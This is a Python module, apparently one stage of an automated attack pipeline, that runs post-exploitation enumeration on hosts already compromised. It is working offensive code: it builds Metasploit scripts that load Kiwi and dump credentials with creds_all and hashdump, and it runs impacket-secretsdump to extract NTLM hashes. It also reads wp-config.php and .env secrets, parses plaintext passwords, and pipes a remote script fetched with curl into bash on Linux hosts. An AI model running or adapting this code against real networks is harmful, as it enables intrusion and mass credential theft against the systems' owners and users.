"""
Stage 7: Post-Exploitation Enumeration
Loads state/exploitation.json (successful exploit sessions) and
state/lateral.json (credential reuse successes) then runs structured,
non-interactive enumeration commands against every accessible host.

Windows hosts: enumerated via WinRM (pywinrm) or a Metasploit RC script.
               Meterpreter RC scripts also load Kiwi and run hashdump.
Linux hosts:   enumerated via paramiko SSH.
               Also attempts to run linux-exploit-suggester via curl pipe.

Any NTLM hashes parsed from secretsdump / hashdump / kiwi output are
added to the credentials_found list for that host.

Output written atomically to state/postex.json.
"""

import json
import os
import pathlib
import re
import subprocess
import tempfile
import textwrap
from datetime import datetime, timezone

STATE_DIR  = pathlib.Path("state")
POSTEX_JSON = STATE_DIR / "postex.json"

# Timeout (seconds) for individual post-ex commands sent over WinRM or SSH
CMD_TIMEOUT    = 30
# Timeout for linux-exploit-suggester (curl + bash pipe needs more time)
LES_TIMEOUT    = 90
# Timeout for the full Metasploit RC script run (kiwi can be slow)
MSF_TIMEOUT    = 120
# Timeout for secretsdump subprocess
SECRETSDUMP_TIMEOUT = 60

# ---------------------------------------------------------------------------
# Windows commands executed for every accessible Windows host
# ---------------------------------------------------------------------------
WINDOWS_COMMANDS = [
    "whoami /all",
    "hostname",
    "ipconfig /all",
    "arp -a",
    "net localgroup administrators",
    "net user",
    'systeminfo | findstr /B /C:"OS" /C:"Domain"',
    r'wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"',
    r"dir C:\Users\*\Desktop\*.txt 2>nul",
    r"dir C:\Users\*\Desktop\*.xlsx 2>nul",
    "wmic qfe get Caption,HotFixID,InstalledOn",          # missing patch list
    "netstat -ano | findstr LISTENING",                   # listening ports / hidden services
    "tasklist /svc",                                      # running services with PIDs
]

# ---------------------------------------------------------------------------
# Linux commands executed for every accessible Linux host
# ---------------------------------------------------------------------------
LINUX_COMMANDS = [
    "id && whoami",
    "hostname && uname -a",
    "ip addr && ip route",
    "cat /etc/passwd | grep -v nologin",
    "sudo -l 2>/dev/null",
    "cat /var/www/html/wp-config.php 2>/dev/null",
    "cat /var/www/html/.env 2>/dev/null",
    "find / -name 'docker-compose.yml' 2>/dev/null | head -5",
    "crontab -l 2>/dev/null",
    "cat /etc/crontab 2>/dev/null",                              # system-wide cron (root jobs)
    "find / -perm -4000 -type f 2>/dev/null | head -10",
    "getcap -r / 2>/dev/null | head -20",                        # capabilities — top privesc vector
    "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",         # listening ports / hidden services
]

# URL for linux-exploit-suggester (pipe via bash without file transfer)
LES_URL = (
    "https://raw.githubusercontent.com/The-Z-Labs/"
    "linux-exploit-suggester/master/linux-exploit-suggester.sh"
)

# Regex to match NTLM hash lines from secretsdump / hashdump output
# Format:  username:RID:LMhash:NThash:::
_NTLM_RE = re.compile(
    r"^(?P<user>[^:]+):(?P<rid>\d+):(?P<lm>[a-fA-F0-9]{32}):(?P<nt>[a-fA-F0-9]{32}):::",
    re.MULTILINE,
)

# Regex for kiwi creds_all / mimikatz output lines
# Format: Domain : DOMAIN  /  User : username  /  Password : plaintext
_KIWI_RE = re.compile(
    r"Domain\s*:\s*(?P<domain>\S+).*?User\s*:\s*(?P<user>\S+).*?Password\s*:\s*(?P<pass>.+?)(?:\n|$)",
    re.DOTALL,
)


# ---------------------------------------------------------------------------
# Helpers: load state files
# ---------------------------------------------------------------------------

def _load_json(path: pathlib.Path) -> dict | list | None:
    try:
        return json.loads(path.read_text())
    except (FileNotFoundError, json.JSONDecodeError):
        return None


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# NTLM hash parsing
# ---------------------------------------------------------------------------

def _parse_ntlm_hashes(text: str) -> list[dict]:
    """
    Extract NTLM hash entries from secretsdump / hashdump output.
    Returns list of dicts: {username, rid, lm_hash, nt_hash}.
    Skips machine accounts (username ending in $) and aad3b entries.
    """
    creds = []
    for m in _NTLM_RE.finditer(text):
        username = m.group("user")
        nt_hash  = m.group("nt")
        lm_hash  = m.group("lm")
        # Skip machine accounts and blank LM placeholders
        if username.endswith("$"):
            continue
        creds.append({
            "username": username,
            "nt_hash":  nt_hash,
            "lm_hash":  lm_hash,
            "type":     "ntlm_hash",
        })
    return creds


def _parse_kiwi_output(text: str) -> list[dict]:
    """
    Extract plaintext credentials from kiwi creds_all output.
    Returns list of dicts: {username, password, domain}.
    """
    creds = []
    seen: set[tuple] = set()
    for m in _KIWI_RE.finditer(text):
        user   = m.group("user").strip()
        pw     = m.group("pass").strip()
        domain = m.group("domain").strip()
        # Skip obviously empty / placeholder passwords
        if not pw or pw in ("(null)", "*"):
            continue
        key = (user.lower(), pw)
        if key not in seen:
            seen.add(key)
            creds.append({"username": user, "password": pw, "domain": domain, "type": "plaintext"})
    return creds


# ---------------------------------------------------------------------------
# secretsdump via impacket-secretsdump subprocess
# ---------------------------------------------------------------------------

def _run_secretsdump(host: str, username: str, password: str, domain: str) -> list[dict]:
    """
    Call impacket-secretsdump against a Windows host and parse NTLM hashes.
    Returns list of credential dicts.
    """
    if domain:
        target = f"{domain}/{username}:{password}@{host}"
    else:
        target = f"{username}:{password}@{host}"

    cmd = ["impacket-secretsdump", target, "-just-dc-ntlm", "-outputfile", "/tmp/autopwn_sd"]
    print(f"[postex]   Running secretsdump against {host}...")
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=SECRETSDUMP_TIMEOUT,
        )
        combined = result.stdout + result.stderr
        creds = _parse_ntlm_hashes(combined)
        print(f"[postex]   secretsdump recovered {len(creds)} NTLM hash(es).")
        return creds
    except FileNotFoundError:
        print("[postex]   impacket-secretsdump not found in PATH; skipping.")
        return []
    except subprocess.TimeoutExpired:
        print(f"[postex]   secretsdump timed out after {SECRETSDUMP_TIMEOUT}s.")
        return []
    except Exception as exc:
        print(f"[postex]   secretsdump error: {exc}")
        return []


# ---------------------------------------------------------------------------
# Meterpreter RC script execution (for hosts with active meterpreter sessions)
# ---------------------------------------------------------------------------

def _build_meterpreter_rc(host: str, session_id: int) -> str:
    """
    Generate a Metasploit resource script that:
      1. Selects the active session
      2. Runs all Windows enumeration commands via 'shell'
      3. Loads Kiwi and dumps all credentials
      4. Runs hashdump
    """
    shell_cmds = "\n".join(
        f'sessions -i {session_id} -c "shell -c \\"{cmd}\\""'
        for cmd in WINDOWS_COMMANDS
    )
    rc = textwrap.dedent(f"""\
        sessions -i {session_id}
        {shell_cmds}
        sessions -i {session_id} -c "load kiwi"
        sessions -i {session_id} -c "creds_all"
        sessions -i {session_id} -c "hashdump"
        exit
    """)
    return rc


def _run_meterpreter_postex(host: str, session_id: int) -> tuple[list[dict], list[dict]]:
    """
    Execute post-ex commands via a Meterpreter session using an RC script.
    Returns (commands_run_list, credentials_found_list).
    """
    rc_content = _build_meterpreter_rc(host, session_id)
    rc_path = pathlib.Path(f"/tmp/autopwn_postex_{host.replace('.', '_')}.rc")
    rc_path.write_text(rc_content)

    print(f"[postex]   Running Meterpreter post-ex RC for session {session_id} on {host}...")
    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(rc_path)],
            capture_output=True,
            text=True,
            timeout=MSF_TIMEOUT,
        )
        output = result.stdout + result.stderr
    except FileNotFoundError:
        print("[postex]   msfconsole not found; skipping Meterpreter post-ex.")
        return [], []
    except subprocess.TimeoutExpired:
        print(f"[postex]   msfconsole timed out after {MSF_TIMEOUT}s.")
        return [], []
    finally:
        rc_path.unlink(missing_ok=True)

    # Parse credential output from kiwi and hashdump
    creds_found = _parse_ntlm_hashes(output) + _parse_kiwi_output(output)

    # Build a single commands_run entry with the full MSF output
    commands_run = [{
        "command": "msfconsole post-ex RC (whoami/ipconfig/kiwi/hashdump)",
        "output": output[:8000],  # cap at 8 KB to keep JSON manageable
    }]

    return commands_run, creds_found


# ---------------------------------------------------------------------------
# WinRM post-ex
# ---------------------------------------------------------------------------

def _run_winrm_postex(
    host: str, username: str, password: str, domain: str
) -> tuple[list[dict], list[dict]]:
    """
    Run all WINDOWS_COMMANDS via pywinrm and optionally secretsdump.
    Returns (commands_run_list, credentials_found_list).
    """
    commands_run: list[dict] = []
    creds_found:  list[dict] = []

    try:
        import winrm  # type: ignore
    except ImportError:
        print("[postex]   pywinrm not installed; skipping WinRM post-ex.")
        return [], []

    win_user = f"{domain}\\{username}" if domain else username
    print(f"[postex]   WinRM post-ex on {host} as {win_user}")

    try:
        session = winrm.Session(
            f"http://{host}:5985/wsman",
            auth=(win_user, password),
            transport="ntlm",
            read_timeout_sec=CMD_TIMEOUT + 5,
            operation_timeout_sec=CMD_TIMEOUT,
        )
    except Exception as exc:
        print(f"[postex]   WinRM session init failed: {exc}")
        return [], []

    for cmd in WINDOWS_COMMANDS:
        print(f"[postex]   Running: {cmd}")
        try:
            result = session.run_cmd(cmd)
            stdout_txt = (result.std_out or b"").decode(errors="replace").strip()
            stderr_txt = (result.std_err or b"").decode(errors="replace").strip()
            output = stdout_txt or stderr_txt or "(no output)"
        except Exception as exc:
            output = f"ERROR: {exc}"
        commands_run.append({"command": cmd, "output": output})

    # Attempt secretsdump to recover NTLM hashes from the domain
    sd_creds = _run_secretsdump(host, username, password, domain)
    creds_found.extend(sd_creds)

    return commands_run, creds_found


# ---------------------------------------------------------------------------
# SSH post-ex (Linux)
# ---------------------------------------------------------------------------

def _run_ssh_postex(
    host: str, username: str, password: str
) -> tuple[list[dict], list[dict]]:
    """
    Run all LINUX_COMMANDS plus linux-exploit-suggester via paramiko SSH.
    Returns (commands_run_list, credentials_found_list).
    """
    commands_run: list[dict] = []
    creds_found:  list[dict] = []  # Linux post-ex rarely produces structured creds

    try:
        import paramiko
    except ImportError:
        print("[postex]   paramiko not installed; skipping SSH post-ex.")
        return [], []

    print(f"[postex]   SSH post-ex on {host} as {username}")

    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host,
            port=22,
            username=username,
            password=password,
            timeout=10,
            banner_timeout=12,
            auth_timeout=12,
            look_for_keys=False,
            allow_agent=False,
        )
    except Exception as exc:
        print(f"[postex]   SSH connection to {host} failed: {exc}")
        return [], []

    # Standard enumeration commands
    for cmd in LINUX_COMMANDS:
        print(f"[postex]   Running: {cmd}")
        try:
            _stdin, stdout, stderr = client.exec_command(cmd, timeout=CMD_TIMEOUT)
            out = stdout.read().decode(errors="replace").strip()
            err = stderr.read().decode(errors="replace").strip()
            output = out or err or "(no output)"
        except Exception as exc:
            output = f"ERROR: {exc}"
        commands_run.append({"command": cmd, "output": output})

    # Linux Exploit Suggester via curl pipe (internet access optional)
    les_cmd = f"curl -s --max-time 15 {LES_URL} | bash 2>/dev/null"
    print(f"[postex]   Running linux-exploit-suggester (curl pipe)...")
    try:
        _stdin, stdout, stderr = client.exec_command(les_cmd, timeout=LES_TIMEOUT)
        les_out = stdout.read().decode(errors="replace").strip()
        les_err = stderr.read().decode(errors="replace").strip()
        les_output = les_out or les_err or "(no output or no internet access)"
    except Exception as exc:
        les_output = f"ERROR: {exc}"
    commands_run.append({
        "command": "linux-exploit-suggester (curl pipe)",
        "output":  les_output[:4000],  # cap output
    })

    client.close()
    return commands_run, creds_found


# ---------------------------------------------------------------------------
# Build the set of accessible sessions from exploitation + lateral state files
# ---------------------------------------------------------------------------

def _collect_access_points(
    exploitation: dict | None,
    lateral: dict | None,
) -> list[dict]:
    """
    Returns a list of access point dicts:
    {
        ip, os_type, method, username, password, domain,
        session_id (Meterpreter only, else None),
    }
    os_type: "windows" | "linux"
    method:  "meterpreter" | "winrm" | "ssh"
    """
    access: list[dict] = []
    seen_ips: set[str] = set()

    # From exploitation results
    if exploitation:
        for result in exploitation.get("results", []):
            if not result.get("success"):
                continue
            ip          = result.get("host", "")
            technique   = result.get("technique", "")
            session_type = result.get("session_type", "")
            creds_list  = result.get("credentials_recovered", [])

            if "meterpreter" in session_type:
                # Extract session ID from evidence string if present
                evidence   = result.get("evidence", "")
                session_id = _extract_session_id(evidence)
                access.append({
                    "ip":         ip,
                    "os_type":    "windows",
                    "method":     "meterpreter",
                    "session_id": session_id,
                    "username":   "",
                    "password":   "",
                    "domain":     "",
                })
                seen_ips.add(ip)
            elif technique == "winrm_creds" or "winrm" in technique:
                cred = creds_list[0] if creds_list else {}
                access.append({
                    "ip":         ip,
                    "os_type":    "windows",
                    "method":     "winrm",
                    "session_id": None,
                    "username":   cred.get("username", ""),
                    "password":   cred.get("password", ""),
                    "domain":     cred.get("domain", ""),
                })
                seen_ips.add(ip)
            elif technique == "ssh_brute" or "ssh" in technique:
                cred = creds_list[0] if creds_list else {}
                access.append({
                    "ip":         ip,
                    "os_type":    "linux",
                    "method":     "ssh",
                    "session_id": None,
                    "username":   cred.get("username", ""),
                    "password":   cred.get("password", ""),
                    "domain":     "",
                })
                seen_ips.add(ip)

    # From lateral movement (credential reuse successes)
    if lateral:
        for event in lateral.get("reuse_events", []):
            if not event.get("success"):
                continue
            ip      = event.get("target_host", "")
            service = event.get("service", "")
            cred    = event.get("credential", {})

            if ip in seen_ips:
                continue  # already have access from exploitation stage

            if service == "winrm":
                access.append({
                    "ip":         ip,
                    "os_type":    "windows",
                    "method":     "winrm",
                    "session_id": None,
                    "username":   cred.get("username", ""),
                    "password":   cred.get("password", ""),
                    "domain":     cred.get("domain", ""),
                })
                seen_ips.add(ip)
            elif service == "ssh":
                access.append({
                    "ip":         ip,
                    "os_type":    "linux",
                    "method":     "ssh",
                    "session_id": None,
                    "username":   cred.get("username", ""),
                    "password":   cred.get("password", ""),
                    "domain":     "",
                })
                seen_ips.add(ip)

    return access


def _extract_session_id(evidence: str) -> int:
    """Parse 'Meterpreter session 3 opened' -> 3, default 1."""
    m = re.search(r"session\s+(\d+)", evidence, re.IGNORECASE)
    return int(m.group(1)) if m else 1


# ---------------------------------------------------------------------------
# Main run()
# ---------------------------------------------------------------------------

def run() -> list[dict]:
    """
    Entry point. Reads exploitation + lateral state, runs post-ex on every
    accessible host, writes state/postex.json, and returns the hosts list.
    """
    STATE_DIR.mkdir(exist_ok=True)

    exploitation = _load_json(STATE_DIR / "exploitation.json")
    lateral      = _load_json(STATE_DIR / "lateral.json")

    if not exploitation and not lateral:
        print("[postex] No exploitation.json or lateral.json found — nothing to enumerate.")
        _write_postex([])
        return []

    access_points = _collect_access_points(exploitation, lateral)

    if not access_points:
        print("[postex] No successful sessions found in state files.")
        _write_postex([])
        return []

    print(f"[postex] Found {len(access_points)} accessible host(s) for post-ex enumeration.")
    host_results: list[dict] = []

    for ap in access_points:
        ip       = ap["ip"]
        os_type  = ap["os_type"]
        method   = ap["method"]
        username = ap["username"]
        password = ap["password"]
        domain   = ap["domain"]

        print(f"\n[postex] === Enumerating {ip} ({os_type}) via {method} ===")

        commands_run:  list[dict] = []
        creds_found:   list[dict] = []
        files_of_interest: list[str] = []

        if method == "meterpreter":
            session_id = ap.get("session_id", 1)
            commands_run, creds_found = _run_meterpreter_postex(ip, session_id)

        elif method == "winrm":
            commands_run, creds_found = _run_winrm_postex(ip, username, password, domain)

        elif method == "ssh":
            commands_run, creds_found = _run_ssh_postex(ip, username, password)

        # Scan command output for interesting file paths
        for entry in commands_run:
            output = entry.get("output", "")
            # Capture any .txt / .xlsx / .conf / .env file paths in output
            file_matches = re.findall(
                r"[A-Za-z]:\\[^\s\"'<>|*?\n]{3,}\.(?:txt|xlsx|conf|ini|env|xml|bak)",
                output,
            ) + re.findall(
                r"/(?:[^\s\"'<>|*?\n]{2,}/)+[^\s\"'<>|*?\n]{1,}\.(?:txt|conf|env|xml|bak|sh|py)",
                output,
            )
            files_of_interest.extend(file_matches)

        host_results.append({
            "ip":                ip,
            "os":                os_type.capitalize(),
            "access_method":     method,
            "commands_run":      commands_run,
            "credentials_found": creds_found,
            "files_of_interest": list(set(files_of_interest)),
            "timestamp":         _now(),
        })

        cmd_count  = len(commands_run)
        cred_count = len(creds_found)
        print(f"[postex]   {ip}: {cmd_count} command(s) run, {cred_count} credential(s) recovered.")

    _write_postex(host_results)
    return host_results


# ---------------------------------------------------------------------------
# Atomic write
# ---------------------------------------------------------------------------

def _write_postex(hosts: list[dict]) -> None:
    STATE_DIR.mkdir(exist_ok=True)
    payload = json.dumps({"hosts": hosts}, indent=2)
    tmp = POSTEX_JSON.with_suffix(".tmp")
    tmp.write_text(payload)
    tmp.rename(POSTEX_JSON)
    print(f"\n[postex] state/postex.json written ({len(hosts)} host(s)).")


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    results = run()
    print(f"\nPost-ex complete. Enumerated {len(results)} host(s).")
    for h in results:
        n_creds = len(h.get("credentials_found", []))
        n_cmds  = len(h.get("commands_run", []))
        print(f"  {h['ip']} ({h['os']}) — {n_cmds} commands, {n_creds} cred(s) recovered.")
